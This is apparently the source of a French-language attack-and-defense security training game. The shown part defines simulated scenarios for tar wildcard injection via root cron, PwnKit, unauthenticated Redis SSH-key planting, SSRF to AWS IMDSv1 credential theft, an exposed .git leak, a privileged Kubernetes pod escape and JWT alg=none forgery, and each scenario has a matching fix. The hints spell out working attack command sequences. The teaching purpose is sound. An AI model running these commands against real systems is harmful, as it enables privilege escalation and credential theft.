      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc','backup','tmp']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob','partage']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/home/partage':{type:'dir',perm:'777',owner:'root',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['cron.d']},
      '/etc/cron.d':{type:'dir',perm:'755',owner:'root',children:['tarbackup']},
      '/etc/cron.d/tarbackup':{type:'file',perm:'644',owner:'root',size:60,
        content:"* * * * * root cd /home/partage && tar czf /backup/home.tar.gz *\n"},
      '/backup':{type:'dir',perm:'700',owner:'root',children:[]},
      '/tmp':{type:'dir',perm:'777',owner:'root',children:[]}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^attendre-cron$/, run(state, print){
        const dirNode = state.vfs['/home/partage'];
        const d = permDigits(dirNode.perm);
        const dirWritable = permAllows(d[1],'w') || permAllows(d[2],'w');
        print("[cron] tar czf /backup/home.tar.gz * exécuté en tant que root dans /home/partage...", 'info');
        if(!dirWritable){
          print("[cron] tar czf terminé sans anomalie (dossier non modifiable par des tiers).", 'info');
          return;
        }
        const f1 = state.vfs['/home/partage/--checkpoint=1'];
        const f2 = state.vfs['/home/partage/--checkpoint-action=exec=sh payload.sh'];
        const f3 = state.vfs['/home/partage/payload.sh'];
        if(!f1 || !f2 || !f3){
          print("[cron] tar czf terminé (aucun fichier d'injection détecté dans /home/partage).", 'info');
          return;
        }
        const payloadOk = /\/tmp\/rootbash/.test(f3.content) && /chmod\s+u\+s/.test(f3.content);
        if(!payloadOk){
          print("[cron] payload.sh exécuté, mais son contenu ne crée aucun binaire SUID exploitable.", 'info');
          return;
        }
        state.vfs['/tmp/rootbash'] = {type:'file',perm:'755',owner:'root',suid:true,size:1234000,content:'[copie de /bin/bash]'};
        if(!state.vfs['/tmp'].children.includes('rootbash')) state.vfs['/tmp'].children.push('rootbash');
        print("[+] tar a interprété les noms de fichiers injectés comme des options --checkpoint : payload.sh exécuté en root.", 'ok');
        print("[+] /tmp/rootbash créé avec un bit SUID root.", 'ok');
      }
    },
    { pattern:/^\/tmp\/rootbash\s+-p$/, run(state, print){
        const node = state.vfs['/tmp/rootbash'];
        if(node && node.suid){
          state.isRoot = true; state.user = 'root';
          print("[+] Shell root obtenu via /tmp/rootbash -p.", 'ok');
        } else {
          print("bash: /tmp/rootbash: Aucun fichier ou dossier de ce type", 'err');
        }
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){
    const d = permDigits(state.vfs['/home/partage'].perm);
    return !permAllows(d[1],'w') && !permAllows(d[2],'w');
  },
  replay(state){
    const log=[];
    const d = permDigits(state.vfs['/home/partage'].perm);
    const writable = permAllows(d[1],'w') || permAllows(d[2],'w');
    log.push({t:"$ touch -- --checkpoint=1 \"--checkpoint-action=exec=sh payload.sh\" payload.sh   (dans /home/partage)", cls:'prompt-line'});
    if(!writable){
      log.push({t:"touch: impossible de créer les fichiers dans '/home/partage' : Permission non accordée", cls:'err'});
      log.push({t:"[-] Le dossier n'est plus modifiable par les tiers : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:"$ attendre-cron", cls:'prompt-line'});
    log.push({t:"[cron] tar czf /backup/home.tar.gz * exécuté en tant que root...", cls:'info'});
    log.push({t:"[+] Injection de wildcard réussie : payload.sh exécuté en root.", cls:'ok'});
    log.push({t:"[+] /tmp/rootbash créé avec un bit SUID root.", cls:'ok'});
    log.push({t:"$ /tmp/rootbash -p", cls:'prompt-line'});
    log.push({t:"[+] Shell root obtenu.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 17. PwnKit — CVE-2021-4034 ===================== */
{
  id:'pwnkit-cve-2021-4034',
  title:"PwnKit : élévation de privilèges via pkexec (CVE-2021-4034)",
  category:'Vulnérabilité polkit (CVE-2021-4034 « PwnKit »)',
  attack:{
    who:'Vous incarnez bob, un utilisateur standard sans aucun privilège particulier.',
    desc:"Le binaire SUID root /usr/bin/pkexec, fourni par polkit, embarque une faille de traitement des arguments (CVE-2021-4034, surnommée PwnKit) sur ce système non patché. Exploitez-la pour obtenir un shell root.",
    hints:[
      "`pkexec --version` affiche la version de polkit installée ; comparez-la aux versions corrigeant CVE-2021-4034 (0.105-31+deb11u1 ou supérieure sur Debian).",
      "Un exploit déjà compilé se trouve dans votre dossier personnel : `ls -la` le révèle.",
      "Lancez-le directement : `./cve-2021-4034` exploite l'absence de vérification du nombre d'arguments (argc=0) de pkexec pour obtenir un shell root."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Mettez à jour polkit vers une version corrigeant CVE-2021-4034, sans désinstaller le paquet.",
    hints:[
      "`apt-get update && apt-get upgrade policykit-1` installe la version corrigée.",
      "Vérifiez ensuite avec `pkexec --version` que la version affichée est bien patchée."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','usr']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:['cve-2021-4034']},
      '/home/bob/cve-2021-4034':{type:'file',perm:'755',owner:'bob',size:18432,content:'[exploit PwnKit précompilé]'},
      '/usr':{type:'dir',perm:'755',owner:'root',children:['bin']},
      '/usr/bin':{type:'dir',perm:'755',owner:'root',children:['pkexec']},
      '/usr/bin/pkexec':{type:'file',perm:'755',owner:'root',suid:true,size:31032,version:'0.105-26',patched:false,content:'[binaire policykit pkexec]'}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^pkexec\s+--version$/, run(state, print){
        const node = state.vfs['/usr/bin/pkexec'];
        print(`pkexec version ${node.version}`, 'out');
        print(node.patched ? "Cette version corrige CVE-2021-4034." : "⚠ Cette version est vulnérable à CVE-2021-4034 (PwnKit).", node.patched?'ok':'err');
      }
    },
    { pattern:/^\.\/cve-2021-4034$|^\/home\/bob\/cve-2021-4034$/, run(state, print){
        const node = state.vfs['/usr/bin/pkexec'];
        if(node.suid && !node.patched){
          state.isRoot = true; state.user = 'root';
          print("[+] Dépassement de l'analyse d'arguments par pkexec (argc=0) exploité.", 'ok');
          print("[+] Shell root obtenu via PwnKit.", 'ok');
          print("FLAG{pwnkit_cve_2021_4034_argc_zero}", 'flagline');
        } else {
          print("pkexec: aucune anomalie détectée (version corrigée, CVE-2021-4034 non exploitable).", 'err');
        }
      }
    },
    { pattern:/^apt-get\s+update\s*&&\s*apt-get\s+upgrade\s+policykit-1$/, run(state, print){
        const node = state.vfs['/usr/bin/pkexec'];
        print("Lecture des listes de paquets... Fait", 'info');
        print("policykit-1 : 0.105-26 -> 0.105-31+deb11u1", 'info');
        node.patched = true;
        node.version = '0.105-31+deb11u1';
        print("[+] polkit mis à jour vers une version corrigeant CVE-2021-4034.", 'ok');
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){ return state.vfs['/usr/bin/pkexec'].patched === true; },
  replay(state){
    const log=[];
    const patched = state.vfs['/usr/bin/pkexec'].patched === true;
    log.push({t:'$ ./cve-2021-4034', cls:'prompt-line'});
    if(patched){
      log.push({t:"pkexec: aucune anomalie détectée (version corrigée, CVE-2021-4034 non exploitable).", cls:'err'});
      log.push({t:"[-] La mise à jour de polkit bloque l'exploitation.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:"[+] Dépassement de l'analyse d'arguments par pkexec (argc=0) exploité.", cls:'ok'});
    log.push({t:"[+] Shell root obtenu via PwnKit.", cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 18. Redis sans authentification ===================== */
{
  id:'redis-unauthenticated',
  title:'Un serveur Redis accessible sans authentification',
  category:'Service réseau non authentifié (Redis)',
  attack:{
    who:'Vous incarnez bob, un utilisateur ayant simplement accès au réseau de target-lab.',
    desc:"Le service Redis de target-lab écoute sur toutes les interfaces sans mot de passe configuré. Détournez-le pour déposer une clé SSH dans le répertoire de root et obtenir un accès administrateur.",
    hints:[
      "`redis-cli -h target-lab ping` répond PONG sans qu'aucune authentification ne soit demandée : le service est ouvert.",
      "`redis-cli -h target-lab config set dir /root/.ssh` puis `redis-cli -h target-lab config set dbfilename authorized_keys` détournent l'emplacement où Redis écrit sa sauvegarde RDB.",
      "`redis-cli -h target-lab set pwnkey \"ssh-ed25519 AAAAC3attackerkey bob@kali\"` place une clé attaquant en valeur, puis `redis-cli -h target-lab save` force l'écriture immédiate du fichier — qui devient alors un authorized_keys valide.",
      "Terminez par `ssh root@target-lab` : la clé injectée vous authentifie directement en tant que root."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Protégez le service Redis avec un mot de passe afin que seules les connexions authentifiées puissent modifier sa configuration.",
    hints:[
      "Éditez `/etc/redis/redis.conf` avec `nano` et ajoutez une ligne `requirepass <mot-de-passe-fort>`.",
      "`verify` confirme que la configuration est reconnue comme durcie."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['redis']},
      '/etc/redis':{type:'dir',perm:'755',owner:'root',children:['redis.conf']},
      '/etc/redis/redis.conf':{type:'file',perm:'644',owner:'root',size:70,
        content:"bind 0.0.0.0\nprotected-mode no\n# aucun mot de passe n'est configuré pour l'instant\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^redis-cli\s+-h\s+\S+\s+ping$/, run(state, print){
        const open = !/requirepass\s+\S+/.test(state.vfs['/etc/redis/redis.conf'].content);
        print(open ? 'PONG' : '(error) NOAUTH Authentication required.', open?'ok':'err');
      }
    },
    { pattern:/^redis-cli\s+-h\s+\S+\s+config\s+set\s+dir\s+\/root\/\.ssh$/, run(state, print){
        const open = !/requirepass\s+\S+/.test(state.vfs['/etc/redis/redis.conf'].content);
        if(!open){ print('(error) NOAUTH Authentication required.', 'err'); return; }
        state.flags = state.flags || {};
        state.flags.redisDir = true;
        print('OK', 'ok');
      }
    },
    { pattern:/^redis-cli\s+-h\s+\S+\s+config\s+set\s+dbfilename\s+authorized_keys$/, run(state, print){
        const open = !/requirepass\s+\S+/.test(state.vfs['/etc/redis/redis.conf'].content);
        if(!open){ print('(error) NOAUTH Authentication required.', 'err'); return; }
        state.flags = state.flags || {};
        state.flags.redisDbfilename = true;
        print('OK', 'ok');
      }
    },
    { pattern:/^redis-cli\s+-h\s+\S+\s+set\s+pwnkey\s+.+$/, run(state, print){
        const open = !/requirepass\s+\S+/.test(state.vfs['/etc/redis/redis.conf'].content);
        if(!open){ print('(error) NOAUTH Authentication required.', 'err'); return; }
        state.flags = state.flags || {};
        state.flags.redisKeySet = true;
        print('OK', 'ok');
      }
    },
    { pattern:/^redis-cli\s+-h\s+\S+\s+save$/, run(state, print){
        const open = !/requirepass\s+\S+/.test(state.vfs['/etc/redis/redis.conf'].content);
        if(!open){ print('(error) NOAUTH Authentication required.', 'err'); return; }
        const f = state.flags || {};
        if(f.redisDir && f.redisDbfilename && f.redisKeySet){
          state.vfs['/root/.ssh/authorized_keys'] = {type:'file',perm:'644',owner:'root',size:60,content:'ssh-ed25519 AAAAC3attackerkey bob@kali\n'};
          f.redisSaved = true;
          print('OK', 'ok');
          print("[+] Fichier RDB écrit dans /root/.ssh/authorized_keys.", 'ok');
        } else {
          print('OK', 'ok');
          print("[i] Sauvegarde effectuée, mais dir/dbfilename/valeur n'ont pas tous été détournés au préalable.", 'info');
        }
      }
    },
    { pattern:/^ssh\s+root@\S+$/, run(state, print){
        if(state.flags && state.flags.redisSaved && state.vfs['/root/.ssh/authorized_keys']){
          state.isRoot = true; state.user = 'root';
          print('[+] Authentification par clé publique acceptée.', 'ok');
          print('[+] Shell root obtenu via Redis non authentifié.', 'ok');
          print("FLAG{redis_sans_auth_ssh_key_injection}", 'flagline');
        } else {
          print('Permission denied (publickey).', 'err');
        }
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){ return /requirepass\s+\S+/.test(state.vfs['/etc/redis/redis.conf'].content); },
  replay(state){
    const log=[];
    const open = !/requirepass\s+\S+/.test(state.vfs['/etc/redis/redis.conf'].content);
    log.push({t:'$ redis-cli -h target-lab ping', cls:'prompt-line'});
    if(!open){
      log.push({t:'(error) NOAUTH Authentication required.', cls:'err'});
      log.push({t:'[-] Redis exige désormais un mot de passe : la faille est corrigée.', cls:'err'});
      return {log, success:false};
    }
    log.push({t:'PONG', cls:'ok'});
    log.push({t:'[+] Détournement de dir/dbfilename puis SAVE : authorized_keys écrasé.', cls:'ok'});
    log.push({t:'$ ssh root@target-lab', cls:'prompt-line'});
    log.push({t:'[+] Shell root obtenu via Redis non authentifié.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 19. SSRF vers les métadonnées cloud (AWS IMDSv1) ===================== */
{
  id:'aws-imds-ssrf',
  title:'SSRF vers les métadonnées cloud (AWS IMDSv1)',
  category:'Cloud / SSRF vers les métadonnées (AWS IMDS)',
  attack:{
    who:'Vous incarnez bob, un utilisateur externe ayant repéré une application web vulnérable sur target-lab.',
    desc:"L'application web interne relaie n'importe quelle URL fournie en paramètre (SSRF) et l'instance cloud expose encore l'API de métadonnées IMDSv1, sans jeton obligatoire. Volez les identifiants du rôle IAM attaché à l'instance.",
    hints:[
      "`curl 'http://webapp.target-lab/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/'` interroge les métadonnées à travers la faille SSRF et révèle le nom du rôle IAM attaché à l'instance.",
      "Ajoutez le nom du rôle à la fin de l'URL pour récupérer les identifiants temporaires complets : `curl 'http://webapp.target-lab/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/backup-role'`.",
      "Une fois les identifiants obtenus, utilisez-les directement : `aws s3 ls --profile stolen` liste le contenu d'un bucket S3 normalement inaccessible."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Forcez l'utilisation d'IMDSv2 (jeton de session obligatoire) sur l'instance, ce qui neutralise ce type de SSRF vers les métadonnées.",
    hints:[
      "Éditez `/etc/cloud/imds-config.yml` avec `nano` et réglez `http_tokens: required` (au lieu de `optional`).",
      "`verify` confirme que le durcissement IMDSv2 est actif."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['cloud']},
      '/etc/cloud':{type:'dir',perm:'755',owner:'root',children:['imds-config.yml']},
      '/etc/cloud/imds-config.yml':{type:'file',perm:'644',owner:'root',size:70,
        content:"# Configuration IMDS de l'instance\nhttp_tokens: optional\nhttp_endpoint: enabled\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^curl\s+'http:\/\/webapp\.target-lab\/fetch\?url=http:\/\/169\.254\.169\.254\/latest\/meta-data\/iam\/security-credentials\/'$/, run(state, print){
        const open = /http_tokens:\s*optional/.test(state.vfs['/etc/cloud/imds-config.yml'].content);
        if(!open){ print('401 Unauthorized: token IMDSv2 requis (en-tête X-aws-ec2-metadata-token manquant).', 'err'); return; }
        state.flags = state.flags || {};
        state.flags.roleFound = true;
        print('backup-role', 'out');
      }
    },
    { pattern:/^curl\s+'http:\/\/webapp\.target-lab\/fetch\?url=http:\/\/169\.254\.169\.254\/latest\/meta-data\/iam\/security-credentials\/backup-role'$/, run(state, print){
        const open = /http_tokens:\s*optional/.test(state.vfs['/etc/cloud/imds-config.yml'].content);
        if(!open){ print('401 Unauthorized: token IMDSv2 requis.', 'err'); return; }
        if(!state.flags || !state.flags.roleFound){ print('curl: rôle IAM inconnu, interrogez d\'abord la liste des rôles.', 'err'); return; }
        print('{"AccessKeyId":"ASIA...STOLEN","SecretAccessKey":"xXsecretXx","Token":"FQoGZX...","Expiration":"2026-07-18T00:00:00Z"}', 'out');
        state.flags.credsStolen = true;
      }
    },
    { pattern:/^aws\s+s3\s+ls\s+--profile\s+stolen$/, run(state, print){
        if(!state.flags || !state.flags.credsStolen){ print('Unable to locate credentials.', 'err'); return; }
        print('2026-07-01 09:12:03  backup-role-bucket/', 'out');
        print("[+] Bucket S3 accessible avec les identifiants IAM volés via SSRF.", 'ok');
        print("FLAG{imds_v1_ssrf_vol_didentifiants_iam}", 'flagline');
        state.flags.exfiltrated = true;
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.exfiltrated === true; },
  defenseCheck(state){ return /http_tokens:\s*required/.test(state.vfs['/etc/cloud/imds-config.yml'].content); },
  replay(state){
    const log=[];
    const open = /http_tokens:\s*optional/.test(state.vfs['/etc/cloud/imds-config.yml'].content);
    log.push({t:"$ curl '.../latest/meta-data/iam/security-credentials/'", cls:'prompt-line'});
    if(!open){
      log.push({t:'401 Unauthorized: token IMDSv2 requis.', cls:'err'});
      log.push({t:"[-] IMDSv2 est désormais obligatoire : la faille SSRF ne suffit plus.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'backup-role', cls:'ok'});
    log.push({t:'[+] Identifiants IAM récupérés via SSRF vers 169.254.169.254.', cls:'ok'});
    log.push({t:'$ aws s3 ls --profile stolen', cls:'prompt-line'});
    log.push({t:'[+] Accès au bucket S3 confirmé.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 20. Dossier .git exposé publiquement ===================== */
{
  id:'git-directory-exposed',
  title:'Le dossier .git exposé publiquement sur le serveur web',
  category:'Fuite de code source (dossier .git exposé)',
  attack:{
    who:'Vous incarnez bob, un utilisateur externe ayant repéré l\'application web de target-lab.',
    desc:"Le serveur web sert par erreur le dossier .git du dépôt de l'application. Récupérez l'historique exposé pour en extraire des identifiants codés en dur, puis utilisez-les pour accéder à la base de données.",
    hints:[
      "`curl http://target-lab/.git/config` répond 200 et affiche la configuration du dépôt : le dossier .git est bien exposé publiquement.",
      "`git-dump http://target-lab/.git ./loot` télécharge l'intégralité de l'historique Git exposé dans un dossier local `loot`.",
      "Une fois dans le bon dossier, `cat config.php` révèle un mot de passe de connexion à la base de données codé en dur dans le code source versionné.",
      "Connectez-vous ensuite avec `mysql -u admin -pDbAdminS3cure2024 -h target-lab` pour confirmer l'accès à la base."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur système chargé de corriger la faille.',
    desc:"Bloquez l'accès public au dossier .git côté serveur web, sans casser le reste du site.",
    hints:[
      "Éditez `/etc/nginx/sites-enabled/target-lab.conf` avec `nano` et ajoutez un bloc du type `location ~ /\\.git { deny all; }`.",
      "`verify` confirme que la règle de blocage est bien présente dans la configuration."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['nginx']},
      '/etc/nginx':{type:'dir',perm:'755',owner:'root',children:['sites-enabled']},
      '/etc/nginx/sites-enabled':{type:'dir',perm:'755',owner:'root',children:['target-lab.conf']},
      '/etc/nginx/sites-enabled/target-lab.conf':{type:'file',perm:'644',owner:'root',size:100,
        content:"server {\n  listen 80;\n  server_name target-lab;\n  root /var/www/app;\n  index index.php;\n}\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^curl\s+http:\/\/target-lab\/\.git\/config$/, run(state, print){
        const c = state.vfs['/etc/nginx/sites-enabled/target-lab.conf'].content;
        const blocked = /\.git/.test(c) && /deny\s+all;/i.test(c);
        if(blocked){ print('403 Forbidden', 'err'); return; }
        print('200 OK', 'out');
        print('[core]\n\trepositoryformatversion = 0\n\tbare = false', 'out');
      }
    },
    { pattern:/^git-dump\s+http:\/\/target-lab\/\.git\s+\.\/loot$/, run(state, print){
        const c = state.vfs['/etc/nginx/sites-enabled/target-lab.conf'].content;
        const blocked = /\.git/.test(c) && /deny\s+all;/i.test(c);
        if(blocked){ print('git-dump: 403 Forbidden — dépôt inaccessible.', 'err'); return; }
        const dirPath = resolvePath(state.cwd, 'loot');
        state.vfs[dirPath] = {type:'dir', perm:'755', owner:'bob', children:['config.php']};
        state.vfs[dirPath+'/config.php'] = {type:'file', perm:'644', owner:'bob', size:80,
          content:"<?php\n$db_host = 'target-lab';\n$db_user = 'admin';\n$db_pass = 'DbAdminS3cure2024';\n"};
        const parentName = dirPath.substring(dirPath.lastIndexOf('/')+1);
        if(!state.vfs[state.cwd].children.includes(parentName)) state.vfs[state.cwd].children.push(parentName);
        state.flags = state.flags || {};
        state.flags.dumped = true;
        print("[+] Historique Git récupéré dans ./loot (reconstruction depuis les objets exposés).", 'ok');
      }
    },
    { pattern:/^mysql\s+-u\s+admin\s+-pDbAdminS3cure2024\s+-h\s+target-lab$/, run(state, print){
        if(!state.flags || !state.flags.dumped){ print("mysql: identifiants inconnus.", 'err'); return; }
        state.flags.dbAccessed = true;
        print("Bienvenue sur le moniteur MySQL. Commandes se terminant par ; ou \\g.", 'out');
        print("[+] Connexion réussie à la base de données de production.", 'ok');
        print("FLAG{git_expose_creds_leak_acces_bdd}", 'flagline');
      }
    }
  ],
  attackCheck(state){ return state.flags && state.flags.dbAccessed === true; },
  defenseCheck(state){
    const c = state.vfs['/etc/nginx/sites-enabled/target-lab.conf'].content;
    return /\.git/.test(c) && /deny\s+all;/i.test(c);
  },
  replay(state){
    const log=[];
    const c = state.vfs['/etc/nginx/sites-enabled/target-lab.conf'].content;
    const blocked = /\.git/.test(c) && /deny\s+all;/i.test(c);
    log.push({t:'$ curl http://target-lab/.git/config', cls:'prompt-line'});
    if(blocked){
      log.push({t:'403 Forbidden', cls:'err'});
      log.push({t:"[-] Le dossier .git n'est plus accessible : la faille est corrigée.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'200 OK', cls:'ok'});
    log.push({t:'[+] Dépôt reconstruit, mot de passe de base de données extrait.', cls:'ok'});
    log.push({t:'$ mysql -u admin -pDbAdminS3cure2024 -h target-lab', cls:'prompt-line'});
    log.push({t:'[+] Connexion à la base de données confirmée.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 21. Pod Kubernetes privilégié (hostPath) ===================== */
{
  id:'k8s-privileged-hostpath',
  title:'Un pod Kubernetes privilégié avec accès au système de fichiers du nœud',
  category:'Évasion de conteneur (Kubernetes hostPath privilégié)',
  attack:{
    who:'Vous incarnez bob, titulaire d\'un compte de service Kubernetes limité mais autorisé à créer des pods dans le namespace "ci".',
    desc:"Aucune politique d'admission n'empêche la création de pods privilégiés montant le système de fichiers du nœud hôte. Créez un pod malveillant pour vous évader vers le nœud et obtenir un accès root sur target-lab.",
    hints:[
      "`kubectl auth can-i create pods --namespace ci` confirme que vous pouvez créer des pods dans ce namespace.",
      "Éditez le manifeste déjà présent avec `nano pwn-pod.yaml` : donnez-lui `privileged: true` et un volume `hostPath` pointant vers `/` monté sur `/host` dans le conteneur.",
      "`kubectl apply -f pwn-pod.yaml` déploie le pod tel quel, si le cluster autorise encore les conteneurs privilégiés.",
      "`kubectl exec -it pwn-pod -- chroot /host sh` bascule alors dans le système de fichiers du nœud avec les privilèges root du conteneur."
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur du cluster chargé de corriger la faille.',
    desc:"Interdisez les conteneurs privilégiés au niveau du contrôleur d'admission, sans bloquer les déploiements légitimes non privilégiés.",
    hints:[
      "Éditez `/etc/kubernetes/admission-control.yaml` avec `nano` et réglez `allowPrivilegedContainer: false`.",
      "`verify` confirme que la politique d'admission interdit désormais les conteneurs privilégiés."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:['pwn-pod.yaml']},
      '/home/bob/pwn-pod.yaml':{type:'file',perm:'644',owner:'bob',size:0,content:''},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['kubernetes']},
      '/etc/kubernetes':{type:'dir',perm:'755',owner:'root',children:['admission-control.yaml']},
      '/etc/kubernetes/admission-control.yaml':{type:'file',perm:'644',owner:'root',size:80,
        content:"apiVersion: v1\nkind: AdmissionConfiguration\nallowPrivilegedContainer: true\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^kubectl\s+auth\s+can-i\s+create\s+pods(\s+--namespace\s+ci)?$/, run(state, print){ print('yes', 'ok'); } },
    { pattern:/^kubectl\s+apply\s+-f\s+pwn-pod\.yaml$/, run(state, print){
        const yaml = state.vfs['/home/bob/pwn-pod.yaml'].content;
        const admission = state.vfs['/etc/kubernetes/admission-control.yaml'].content;
        const wellFormed = /privileged:\s*true/.test(yaml) && /hostPath/.test(yaml);
        if(!wellFormed){
          print("error: le manifeste ne définit pas de conteneur privilégié avec volume hostPath valide.", 'err');
          return;
        }
        const allowed = /allowPrivilegedContainer:\s*true/.test(admission);
        if(!allowed){
          print('Error from server (Forbidden): pods "pwn-pod" is forbidden: violates PodSecurity "restricted": privileged containers are not allowed', 'err');
          return;
        }
        state.flags = state.flags || {};
        state.flags.podRunning = true;
        print('pod/pwn-pod created', 'ok');
      }
    },
    { pattern:/^kubectl\s+exec\s+-it\s+pwn-pod\s+--\s+chroot\s+\/host\s+sh$/, run(state, print){
        if(state.flags && state.flags.podRunning){
          state.isRoot = true; state.user = 'root';
          print("[+] chroot vers le système de fichiers du nœud réussi.", 'ok');
          print("[+] Shell root obtenu sur target-lab via évasion de pod privilégié.", 'ok');
          print("FLAG{k8s_hostpath_pod_privilegie_evasion}", 'flagline');
        } else {
          print('error: unable to upgrade connection: pod "pwn-pod" not found', 'err');
        }
      }
    }
  ],
  attackCheck(state){ return state.isRoot === true; },
  defenseCheck(state){ return /allowPrivilegedContainer:\s*false/.test(state.vfs['/etc/kubernetes/admission-control.yaml'].content); },
  replay(state){
    const log=[];
    const allowed = /allowPrivilegedContainer:\s*true/.test(state.vfs['/etc/kubernetes/admission-control.yaml'].content);
    log.push({t:'$ kubectl apply -f pwn-pod.yaml', cls:'prompt-line'});
    if(!allowed){
      log.push({t:'Error from server (Forbidden): privileged containers are not allowed', cls:'err'});
      log.push({t:"[-] Le contrôleur d'admission bloque désormais les conteneurs privilégiés.", cls:'err'});
      return {log, success:false};
    }
    log.push({t:'pod/pwn-pod created', cls:'ok'});
    log.push({t:'$ kubectl exec -it pwn-pod -- chroot /host sh', cls:'prompt-line'});
    log.push({t:'[+] Shell root obtenu sur target-lab.', cls:'ok'});
    return {log, success:true};
  }
},

/* ===================== 22. JWT alg=none ===================== */
{
  id:'jwt-alg-none-forgery',
  title:'Falsification de jeton JWT via l\'algorithme "none"',
  category:'API web (falsification de JWT, alg=none)',
  attack:{
    who:'Vous incarnez bob, utilisateur authentifié avec un compte standard sur l\'API de target-lab.',
    desc:'L\'API accepte des jetons JWT signés avec l\'algorithme "none" sans le vérifier réellement. Forgez un jeton administrateur non signé pour élever vos privilèges.',
    hints:[
      "`curl http://api.target-lab/whoami -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYm9iIiwicm9sZSI6InVzZXIifQ.sig'` confirme votre jeton actuel : rôle `user`.",
      "L'API accepte l'algorithme `none` : un jeton dont l'en-tête déclare `alg: none` et qui ne comporte aucune signature est accepté tel quel.",
      "Forgez ce jeton avec `jwt-forge --alg none --claims '{\"user\":\"bob\",\"role\":\"admin\"}'` : la commande vous donne le jeton exact à réutiliser.",
      "Envoyez-le ensuite : `curl http://api.target-lab/admin -H 'Authorization: Bearer eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiYm9iIiwicm9sZSI6ImFkbWluIn0.'`"
    ]
  },
  defense:{
    who:'Vous incarnez désormais l\'administrateur de l\'API chargé de corriger la faille.',
    desc:"Interdisez l'algorithme none côté serveur, sans casser la vérification des jetons légitimement signés.",
    hints:[
      "Éditez `/etc/api/jwt-config.yml` avec `nano` et retirez `none` de la liste `allowed_algorithms` (ne conservez que HS256).",
      "`verify` confirme que la configuration n'autorise plus l'algorithme none."
    ]
  },
  makeVfs(){
    return {
      '/':{type:'dir',perm:'755',owner:'root',children:['home','etc']},
      '/home':{type:'dir',perm:'755',owner:'root',children:['bob']},
      '/home/bob':{type:'dir',perm:'755',owner:'bob',children:[]},
      '/etc':{type:'dir',perm:'755',owner:'root',children:['api']},
      '/etc/api':{type:'dir',perm:'755',owner:'root',children:['jwt-config.yml']},
      '/etc/api/jwt-config.yml':{type:'file',perm:'644',owner:'root',size:40,
        content:"allowed_algorithms: [HS256, none]\n"}
    };
  },
  startUserAttack:'bob', startCwdAttack:'/home/bob',
  exploitRules:[
    { pattern:/^curl\s+http:\/\/api\.target-lab\/whoami\s+-H\s+'Authorization:\s+Bearer\s+eyJhbGciOiJIUzI1NiJ9\.eyJ1c2VyIjoiYm9iIiwicm9sZSI6InVzZXIifQ\.sig'$/, run(state, print){
        print('{"user":"bob","role":"user"}', 'out');
      }
    },
    { pattern:/^jwt-forge\s+--alg\s+none\s+--claims\s+'\{"user":"bob","role":"admin"\}'$/, run(state, print){
        state.flags = state.flags || {};
        state.flags.forged = true;
